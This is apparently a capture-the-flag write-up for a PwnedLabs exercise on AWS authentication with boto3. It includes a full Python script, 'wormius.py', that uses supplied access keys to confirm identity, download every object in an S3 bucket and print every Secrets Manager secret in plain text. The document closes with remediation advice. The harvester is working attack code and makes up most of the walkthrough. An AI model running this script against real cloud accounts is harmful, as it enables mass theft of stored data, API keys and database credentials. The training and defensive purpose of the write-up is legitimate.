## Disclosure
This documentation is intended for educational purposes only. All activities were performed within a controlled, authorized environment provided by [PwnedLabs](https://pwnedlabs.io/). This write-up focuses strictly on the methodology, vulnerability analysis, and security remediation techniques. All sensitive identifiers, including credentials, tokens, and specific PII, have been redacted or generalized to comply with security best practices and the platform's Terms of Service. The intent of this content is to foster professional development and contribute to the cybersecurity community's knowledge base.

**The lab:** https://pwnedlabs.io/labs/understand-authentication-mechanisms-using-boto3

---
## Vulnerability Summary
The environment is vulnerable to **over-privileged IAM identities** and the **improper exposure of sensitive configuration data** through `Secrets Manager`. This walkthrough demonstrates how automated tooling (`boto3`) can be used to pivot from identity verification to full resource exfiltration.

1. **Identity Misconfiguration**: The provided IAM credentials possessed overly broad permissions, allowing the use of `sts:GetCallerIdentity` to confirm user privileges and target account details.
2. **S3 Data Exfiltration**: Due to permissive bucket policies, the authenticated identity was able to perform `s3:ListObjectsV2` and `s3:GetObject`, facilitating the automated exfiltration of all objects within the target bucket.
3. **Secrets Manager Compromise**: The identity also held `secretsmanager:ListSecrets` and `secretsmanager:GetSecretValue` permissions. By iterating through available secrets, the script decrypted and displayed sensitive application configuration data, including API keys and database credentials.
4. **Impact**: The automation of these actions demonstrates how a single compromised credential set can be used to rapidly map and exploit an AWS environment's most sensitive assets.

---
## Walkthrough
Followed the lab and modified the script to this custom script for authenticated S3 enumeration and exfiltration:

```python
#!/usr/bin/env python3
"""
Tool Name: wormius.py (The Wormius Translator)
Author: Erick Tafel (g1gs)
Purpose: Authenticated AWS S3 and Secrets Manager harvester with a H.P. Lovecraft theme.
"""

import boto3              # pip3 install boto3 in your VM/docker/host
import json
import os
import argparse
from datetime import datetime

# Custom serializer to bypass datetime JSON serialization issues
def serialize_datetime(obj):
    if isinstance(obj, datetime):
        return obj.isoformat()
    raise TypeError(f"Type {type(obj)} not serializable")

usage_example = """
Syntax Example:
  python3 wormius.py -k <ACCESS_KEY> -s <SECRET_KEY> -r eu-north-1 -b <BUCKET_NAME>
"""

parser = argparse.ArgumentParser(
    description="Wormius Translator - Authenticated AWS Explorer",
    epilog=usage_example,
    formatter_class=argparse.RawDescriptionHelpFormatter
)

parser.add_argument("-k", "--key", required=True, help="AWS Access Key ID")
parser.add_argument("-s", "--secret", required=True, help="AWS Secret Access Key")
parser.add_argument("-r", "--region", default="us-east-1", help="AWS Region (Default: us-east-1)")
parser.add_argument("-b", "--bucket", required=True, help="Target S3 Bucket Name to pillage")

# This catches syntax errors and forces your custom example string to print out
try:
    args = parser.parse_args()
except SystemExit:
    print(usage_example)
    raise

access_key = args.key
secret_access_key = args.secret
region = args.region
bucket_name = args.bucket

# Prepare local repository library to receive the files
try:
    os.mkdir(bucket_name)
except Exception:
    pass
os.chdir(bucket_name)

session = boto3.Session(
    aws_access_key_id=access_key, 
    aws_secret_access_key=secret_access_key,
    region_name=region
)

s3_client = session.client("s3")
sts_client = session.client("sts")
secrets_client = session.client("secretsmanager")

# --- Step 1: Querying the STS Identity ---
print("[*] Peer into the void to identify the calling entity...")
try:
    sts_identity = sts_client.get_caller_identity()
    if sts_identity:
        print(f"[+] Manifested Identity:")
        print(f"  -> UserId:  {sts_identity['UserId']}")
        print(f"  -> Account: {sts_identity['Account']}")
        print(f"  -> ARN:     {sts_identity['Arn']}\n")
except Exception as e:
    print(f"[-] The ritual fractured. Failed to verify identity: {e}\n")
    sts_identity = None

# --- Step 2: Pillaging S3 Bucket Objects ---
if sts_identity:
    print(f"[*] Excavate the S3 Vault: [{bucket_name}]")
    try:
        bucket_objects = s3_client.list_objects_v2(Bucket=bucket_name)
        
        if "Contents" in bucket_objects:
            print("[+] Discovering structural vault layout fragments:")
            for obj in bucket_objects["Contents"]:
                file_name = str(obj["Key"])
                print(f"  -> Fragment Located: {file_name}")
                
                with open(file_name, "wb") as local_file:
                    s3_client.download_fileobj(bucket_name, file_name, local_file)
                    print(f"    [+] {file_name} safely archived in the local library.")
        else:
            print("[-] The vault is barren. No files exist within this path.")
    except Exception as e:
        print(f"[-] Sanity Check: Access to S3 vault [{bucket_name}] is sealed or denied: {e}")

# --- Step 3: Extracting Hidden Secrets Manager Strings ---
print("\n[*] Unearthing locked Secrets Manager relics...")
try:
    secrets_list = secrets_client.list_secrets()
    if secrets_list and secrets_list.get("SecretList"):
        print("[+] Encrypted runes located in the database:")
        
        for secret in secrets_list.get("SecretList"):
            secret_name = secret["Name"]
            print(f"  -> Target Secret Found: {secret_name}")
            
            try:
                # Attempting plain-text translation/decryption of the secret payload
                secret_payload = secrets_client.get_secret_value(SecretId=secret_name)
                print(f"    [~] Translating forbidden secret string for [{secret_name}]:")
                
                # Format and print the raw decrypted contents cleanly
                formatted_secret = json.dumps(secret_payload, indent=4, sort_keys=True, default=serialize_datetime)
                print(formatted_secret)
                
            except Exception:
                print(f"    [-] Sanity Check: The seals on [{secret_name}] resist translation.")
    else:
        print("[-] No hidden secrets found within this dimensional plane.")
except Exception as e:
    print(f"[-] Sanity Check: Secrets Manager queries completely blocked: {e}")
```

---
## Remediations
1. **Apply Principle of Least Privilege (PoLP)**:
   - Audit IAM policies assigned to human and machine identities. Ensure that users only possess the specific permissions needed for their tasks (e.g., limit S3 access to specific buckets or prefixes).
   - Avoid using long-lived `Access Keys` and `Secret Access Keys`. Transition to temporary credentials using `IAM Roles` or `AWS STS` where possible.

2. **Harden Secrets Management**:
   - Apply restrictive resource-based policies to `Secrets Manager`. Use `kms:EncryptionContext` to ensure that only authorized entities can decrypt specific secrets.
   - Regularly rotate secrets using `AWS Secrets Manager` to minimize the impact of a credential leak.

3. **Monitor API Activity**:
   - Enable `AWS CloudTrail` to log all API calls. Set up alerts for high-frequency `ListSecrets` or `GetSecretValue` calls, which are indicators of automated exfiltration scripts.
   - Utilize `Amazon GuardDuty` to detect anomalous behavior, such as unauthorized API calls from unrecognized IP addresses or unusual user-agent strings.

4. **Resource-Level Controls**:
   - Use `IAM Policy` conditions to restrict access to specific resources (like S3 buckets or specific Secrets Manager ARNs) based on the `aws:PrincipalArn` or the requesting VPC.
